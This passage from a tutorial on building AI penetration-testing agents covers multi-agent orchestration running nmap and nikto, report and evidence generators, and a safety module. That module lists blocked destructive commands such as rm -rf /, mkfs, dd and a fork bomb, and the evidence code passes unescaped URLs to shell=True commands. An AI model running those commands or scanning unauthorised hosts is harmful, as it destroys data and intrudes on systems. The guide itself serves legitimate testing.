        if any(p in nmap_output for p in ["80/", "443/", "8080/"]):
            self.send_message("scanner", "web",
                             f"Web services detected. Scan results:\n{nmap_output[:3000]}")

            # Phase 3: Web agent performs web testing
            print("\n[Phase 3] Web Testing Agent")
            web_analysis = self.agents["web"].think(
                f"Perform web security assessment on http://{self.target}"
            )
            nikto_output = self.agents["web"].execute_tool(
                f"nikto -h http://{self.target} -maxtime 120"
            )
            print(f"  Web: {web_analysis[:200]}")

            # Share with exploit agent
            self.send_message("web", "exploit",
                             f"Web assessment results:\n{nikto_output[:3000]}")

        # Phase 4: Exploit agent evaluates
        print("\n[Phase 4] Exploitation Agent")
        exploit_analysis = self.agents["exploit"].think(
            "Review all findings and identify exploitable vulnerabilities. "
            "Suggest specific exploitation techniques."
        )
        print(f"  Exploit: {exploit_analysis[:200]}")

        # Phase 5: Report agent compiles everything
        print("\n[Phase 5] Reporting Agent")
        all_context = "\n---\n".join([
            f"Recon: {recon_result[:1000]}",
            f"Scanner: {scan_analysis[:1000]}",
            f"Exploit: {exploit_analysis[:1000]}"
        ])
        report = self.agents["reporter"].think(
            f"Create a penetration test report for {self.target} using these findings:\n{all_context}"
        )
        print(f"  Report: {report[:200]}")

        # Save report
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = f"./reports/multi_agent_{ts}.md"
        os.makedirs("./reports", exist_ok=True)
        with open(report_path, "w") as f:
            f.write(report)

        print(f"\n[+] Report saved: {report_path}")
        return report


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "scanme.nmap.org"
    orchestrator = AgentOrchestrator(target)
    orchestrator.run_collaborative_pentest()
```

```bash [Run Multi-Agent Pentest]
python3 agents/multi_agent.py 192.168.1.100
```

---

## Step 10 — Reporting Automation & Evidence Collection

### Automated Report Generator

```python [reporting/report_generator.py]
#!/usr/bin/env python3
"""
Automated penetration test report generator.
Compiles findings, evidence, and screenshots into professional reports.
"""

import json
import os
import glob
from datetime import datetime
from jinja2 import Template
from pathlib import Path


class PentestReportGenerator:
    """Generate professional penetration test reports."""

    def __init__(self, evidence_dir: str = "./evidence", report_dir: str = "./reports"):
        self.evidence_dir = evidence_dir
        self.report_dir = report_dir
        os.makedirs(report_dir, exist_ok=True)

    def collect_evidence(self) -> list:
        """Collect all evidence files."""
        evidence = []
        for filepath in sorted(glob.glob(f"{self.evidence_dir}/*.json")):
            try:
                with open(filepath) as f:
                    data = json.load(f)
                    data["_filepath"] = filepath
                    evidence.append(data)
            except (json.JSONDecodeError, IOError):
                continue
        return evidence

    def collect_findings(self) -> list:
        """Collect all finding files."""
        findings = []
        for filepath in sorted(glob.glob(f"{self.evidence_dir}/finding_*.json")):
            try:
                with open(filepath) as f:
                    findings.append(json.load(f))
            except (json.JSONDecodeError, IOError):
                continue
        return findings

    def generate_markdown_report(self, target: str, tester: str = "AI Agent") -> str:
        """Generate a Markdown penetration test report."""
        findings = self.collect_findings()
        evidence = self.collect_evidence()

        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        findings.sort(key=lambda x: severity_order.get(x.get("severity", "info").lower(), 5))

        # Count by severity
        severity_counts = {}
        for f in findings:
            sev = f.get("severity", "info").upper()
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        template = Template("""# Penetration Test Report

## Engagement Details

| Field          | Value                              |
| -------------- | ---------------------------------- |
| **Target**     | {{ target }}                       |
| **Tester**     | {{ tester }}                       |
| **Date**       | {{ date }}                         |
| **Total Findings** | {{ findings | length }}        |
| **Critical**   | {{ severity_counts.get('CRITICAL', 0) }} |
| **High**       | {{ severity_counts.get('HIGH', 0) }}     |
| **Medium**     | {{ severity_counts.get('MEDIUM', 0) }}   |
| **Low**        | {{ severity_counts.get('LOW', 0) }}      |
| **Info**       | {{ severity_counts.get('INFO', 0) }}     |

---

## Executive Summary

An automated penetration test was conducted against **{{ target }}** on {{ date }}.
The assessment identified **{{ findings | length }}** findings across various severity levels.
{% if severity_counts.get('CRITICAL', 0) > 0 %}
**{{ severity_counts.get('CRITICAL', 0) }} critical vulnerabilities** were identified that
require immediate remediation.
{% endif %}

---

## Findings Summary

| # | Severity | Title | Timestamp |
|---|----------|-------|-----------|
{% for f in findings %}
| {{ loop.index }} | **{{ f.severity | upper }}** | {{ f.title }} | {{ f.timestamp }} |
{% endfor %}

---

## Detailed Findings

{% for f in findings %}
### Finding {{ loop.index }}: {{ f.title }}

| Field | Value |
|-------|-------|
| **Severity** | {{ f.severity | upper }} |
| **Timestamp** | {{ f.timestamp }} |

**Description:**
{{ f.description }}

**Evidence:**
```
{{ f.evidence[:2000] }}
```

---

{% endfor %}

## Evidence Log

{{ evidence | length }} evidence files collected during the assessment.

{% for e in evidence[:20] %}
- `{{ e._filepath | basename }}` — {{ e.get('tool', 'unknown') }} — {{ e.get('timestamp', '') }}
{% endfor %}

---

## Methodology

The assessment followed the PTES (Penetration Testing Execution Standard) methodology:
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting

---

*Report generated automatically by AI Pentesting Agent*
*{{ date }}*
""")

        report = template.render(
            target=target,
            tester=tester,
            date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            findings=findings,
            evidence=evidence,
            severity_counts=severity_counts
        )

        # Save report
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join(self.report_dir, f"pentest_report_{ts}.md")
        with open(report_path, "w") as f:
            f.write(report)

        print(f"[+] Report generated: {report_path}")
        return report_path


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    generator = PentestReportGenerator()
    path = generator.generate_markdown_report(target)
    print(f"Report: {path}")
```

### Screenshot & Evidence Collection

```python [evidence/screenshot_collector.py]
#!/usr/bin/env python3
"""Screenshot and evidence collection utilities."""

import subprocess
import os
from datetime import datetime
from pathlib import Path


class EvidenceCollector:
    """Collect screenshots and evidence during pentesting."""

    def __init__(self, evidence_dir: str = "./evidence"):
        self.evidence_dir = Path(evidence_dir)
        self.screenshots_dir = self.evidence_dir / "screenshots"
        self.screenshots_dir.mkdir(parents=True, exist_ok=True)

    def take_web_screenshot(self, url: str, filename: str = None) -> str:
        """Take screenshot of a web page using various tools."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = filename or f"screenshot_{ts}.png"
        filepath = str(self.screenshots_dir / fname)

        # Try gowitness first
        try:
            subprocess.run(
                f"gowitness single --url {url} --screenshot-path {self.screenshots_dir}",
                shell=True, timeout=30, capture_output=True
            )
            if os.path.exists(filepath):
                return filepath
        except Exception:
            pass

        # Fallback to cutycapt
        try:
            subprocess.run(
                f"cutycapt --url={url} --out={filepath}",
                shell=True, timeout=30, capture_output=True
            )
            if os.path.exists(filepath):
                return filepath
        except Exception:
            pass

        # Fallback to wkhtmltoimage
        try:
            subprocess.run(
                f"wkhtmltoimage {url} {filepath}",
                shell=True, timeout=30, capture_output=True
            )
        except Exception:
            pass

        return filepath if os.path.exists(filepath) else ""

    def capture_terminal_output(self, command: str, filename: str = None) -> str:
        """Capture terminal command output with timestamps."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = filename or f"terminal_{ts}.txt"
        filepath = str(self.evidence_dir / fname)

        try:
            # Use script command for full terminal capture
            subprocess.run(
                f"script -qc '{command}' {filepath}",
                shell=True, timeout=300
            )
        except Exception:
            # Fallback to simple capture
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
            with open(filepath, "w") as f:
                f.write(f"Command: {command}\nTimestamp: {ts}\n{'='*60}\n")
                f.write(result.stdout + result.stderr)

        return filepath

    def bulk_web_screenshots(self, urls: list) -> list:
        """Take screenshots of multiple URLs."""
        results = []
        for url in urls:
            path = self.take_web_screenshot(url)
            results.append({"url": url, "screenshot": path})
        return results
```

---

## Step 11 — Security & Rate Limiting

### Agent Safety Configuration

```python [config/safety.py]
#!/usr/bin/env python3
"""
Safety configuration and rate limiting for AI pentesting agents.
Prevents accidental damage and ensures responsible testing.
"""

import time
import os
from collections import defaultdict
from functools import wraps


class SafetyConfig:
    """Safety configuration for pentesting agents."""

    # Commands that are NEVER allowed
    BLOCKED_COMMANDS = [
        "rm -rf /", "rm -rf /*", "mkfs", "dd if=/dev/zero",
        "shutdown", "reboot", "halt", "poweroff",
        ":(){ :|:& };:", "fork", "chmod -R 777 /",
        "> /dev/sda", "mv /* /dev/null"
    ]

    # Tools that require explicit confirmation
    CONFIRMATION_REQUIRED = [
        "sqlmap", "hydra", "metasploit", "msfconsole",
        "exploit", "payload", "reverse_shell"
    ]

    # Maximum concurrent tool executions
    MAX_CONCURRENT = 3

    # Rate limits (per minute)
    RATE_LIMITS = {
        "nmap": 5,
        "nikto": 3,
        "gobuster": 5,
        "sqlmap": 2,
        "hydra": 1,
        "nuclei": 3,
        "default": 10
    }

    # Maximum output size (bytes)
    MAX_OUTPUT_SIZE = 100_000

    # Timeout limits (seconds)
    TIMEOUTS = {
        "nmap": 900,
        "nikto": 600,
        "gobuster": 300,
        "sqlmap": 900,
        "hydra": 900,
        "nuclei": 600,
        "default": 300
    }


class RateLimiter:
    """Token bucket rate limiter for tool execution."""

    def __init__(self):
        self._timestamps = defaultdict(list)

    def check(self, tool: str) -> bool:
        """Check if tool execution is within rate limit."""
        limit = SafetyConfig.RATE_LIMITS.get(tool, SafetyConfig.RATE_LIMITS["default"])
        now = time.time()

        # Clean old timestamps (older than 60s)
        self._timestamps[tool] = [t for t in self._timestamps[tool] if now - t < 60]

        if len(self._timestamps[tool]) >= limit:
            return False

        self._timestamps[tool].append(now)
        return True

    def wait_time(self, tool: str) -> float:
        """Get time to wait before next execution is allowed."""
        limit = SafetyConfig.RATE_LIMITS.get(tool, SafetyConfig.RATE_LIMITS["default"])
        now = time.time()
        self._timestamps[tool] = [t for t in self._timestamps[tool] if now - t < 60]

        if len(self._timestamps[tool]) < limit:
            return 0

        oldest = min(self._timestamps[tool])
        return max(0, 60 - (now - oldest))


def require_confirmation(func):
    """Decorator that requires user confirmation for dangerous operations."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        if os.getenv("REQUIRE_CONFIRMATION", "true").lower() == "true":
            command = kwargs.get("command", str(args))
            print(f"\n⚠️  Confirmation required for: {command}")
            response = input("Execute? (yes/no): ").strip().lower()
            if response not in ("yes", "y"):
                return "Operation cancelled by user."
        return func(*args, **kwargs)
    return wrapper


# Global rate limiter instance
rate_limiter = RateLimiter()
```

---

## Project Structure

::code-collapse

```text [Full Project Structure]
~/ai-pentest-agent/
├── .env                              # Environment variables and API keys
├── CLAUDE.md                         # Claude Code instructions
├── docker-compose.yml                # Docker services
├── requirements.txt                  # Python dependencies
│
├── agents/                           # AI agent implementations
│   ├── langchain_agent.py           # LangChain single agent
│   ├── langgraph_workflow.py        # LangGraph stateful workflow
│   ├── crewai_pentest.py            # CrewAI multi-agent crew
│   ├── autogpt_pentest.py           # AutoGPT autonomous agent
│   └── multi_agent.py              # Multi-agent collaboration
│
├── mcp-servers/                      # MCP server implementations
│   ├── kali_mcp.py                  # Kali Linux tools MCP server
│   ├── requirements.txt             # MCP dependencies
│   └── Dockerfile                   # MCP server container
│
├── knowledge/                        # Vector database setup
│   ├── chroma_setup.py              # ChromaDB initialization
│   └── qdrant_setup.py             # Qdrant initialization
│
├── tools/                            # Custom tool wrappers
│   └── tool_wrapper.py             # Standardized tool wrappers
│
├── prompts/                          # Prompt engineering
│   └── pentest_prompts.py          # System prompts and templates
│
├── memory/                           # Agent memory management
│   └── agent_memory.py             # Multi-layered memory system
│
├── reporting/                        # Report generation
│   └── report_generator.py         # Automated report generator
│
├── evidence/                         # Evidence collection
│   ├── screenshot_collector.py     # Screenshot utilities
│   └── screenshots/                # Captured screenshots
│
├── config/                           # Configuration files
│   ├── safety.py                   # Safety and rate limiting
│   └── litellm_config.yaml         # LiteLLM API gateway config
│
├── data/                             # Persistent data
│   ├── chromadb/                   # ChromaDB storage
│   ├── memory/                     # Agent memory storage
│   └── pentest.db                  # SQLite database
│
└── reports/                          # Generated reports
    └── *.md                        # Markdown reports
```

::

---

## Quick Start Commands

::steps{level="4"}

#### Clone and setup

```bash [Terminal]
mkdir -p ~/ai-pentest-agent && cd ~/ai-pentest-agent
python3 -m venv venv && source venv/bin/activate
pip install langchain langchain-ollama langchain-anthropic langgraph crewai chromadb sentence-transformers python-nmap rich
```

#### Start Ollama and pull models

```bash [Terminal]
ollama serve &
ollama pull llama3.1:8b
```

#### Initialize knowledge base

```bash [Terminal]
python3 knowledge/chroma_setup.py
```

#### Run single agent (LangChain)

```bash [Terminal]
python3 agents/langchain_agent.py
# > Scan 192.168.1.100 for open ports and vulnerabilities
```

#### Run multi-agent crew (CrewAI)

```bash [Terminal]
python3 agents/crewai_pentest.py 192.168.1.100
```

#### Run autonomous agent (AutoGPT-style)

```bash [Terminal]
python3 agents/autogpt_pentest.py 192.168.1.100
```

#### Run with Claude Code + MCP

```bash [Terminal]
claude --mcp-config ~/.claude/claude_code_config.json
# > Perform a full pentest on 192.168.1.100
```

#### Generate report

```bash [Terminal]
python3 reporting/report_generator.py 192.168.1.100
```

::

---

## Tool Resources

::card-group

::card
---
title: Ollama
icon: i-simple-icons-ollama
to: https://ollama.ai
target: _blank
---
Run large language models locally. Supports Llama 3.1, Mistral, CodeLlama, DeepSeek, Qwen, and many more. Zero-config GPU acceleration.
::

::card
---
title: LangChain
icon: i-simple-icons-langchain
to: https://langchain.com
target: _blank
---
Framework for building LLM-powered applications. Provides tool calling, chains, agents, retrieval, and memory management.
::

::card
---
title: LangGraph
icon: i-simple-icons-langchain
to: https://langchain-ai.github.io/langgraph/
target: _blank
---
Build stateful, multi-step agent workflows as directed graphs. Supports cycles, branching, and human-in-the-loop patterns.
::

::card
---
title: CrewAI
icon: i-simple-icons-github
to: https://github.com/crewAIInc/crewAI
target: _blank
---
Multi-agent orchestration framework. Create crews of specialized AI agents that collaborate on complex tasks with role-based execution.
::

::card
---
title: ChromaDB
icon: i-simple-icons-github
to: https://github.com/chroma-core/chroma
target: _blank
---
Open-source embedding database. Store and query pentesting knowledge using semantic search. Runs locally with persistent storage.
::

::card
---
title: Qdrant
icon: i-simple-icons-github
to: https://github.com/qdrant/qdrant
target: _blank
---
High-performance vector database written in Rust. Production-ready with filtering, payload indexing, and distributed deployment.
::

::card
---
title: Flowise AI
icon: i-simple-icons-github
to: https://github.com/FlowiseAI/Flowise
target: _blank
---
Visual drag-and-drop LLM flow builder. Create pentesting workflows visually by connecting nodes for tools, models, and memory.
::

::card
---
title: n8n
icon: i-simple-icons-n8n
to: https://n8n.io
target: _blank
---
Workflow automation platform. Connect AI agents with webhooks, APIs, databases, and notification services for end-to-end automation.
::

::card
---
title: Claude Code
icon: i-simple-icons-anthropic
to: https://docs.anthropic.com/en/docs/claude-code
target: _blank
---
Anthropic's agentic coding tool. Connects to MCP servers for direct tool execution with advanced reasoning capabilities.
::

::card
---
title: MCP Specification
icon: i-simple-icons-github
to: https://modelcontextprotocol.io
target: _blank
---
Model Context Protocol open standard. Standardized interface for connecting AI models to external tools, filesystems, and services.
::

::card
---
title: AutoGPT
icon: i-simple-icons-github
to: https://github.com/Significant-Gravitas/AutoGPT
target: _blank
---
Autonomous AI agent framework. Self-directed task planning and execution with memory, web browsing, and tool use capabilities.
::

::card
---
title: LiteLLM
icon: i-simple-icons-github
to: https://github.com/BerriAI/litellm
target: _blank
---
Unified API gateway for 100+ LLM providers. Route requests between Ollama, Claude, OpenAI, and local models with a single interface.
::

::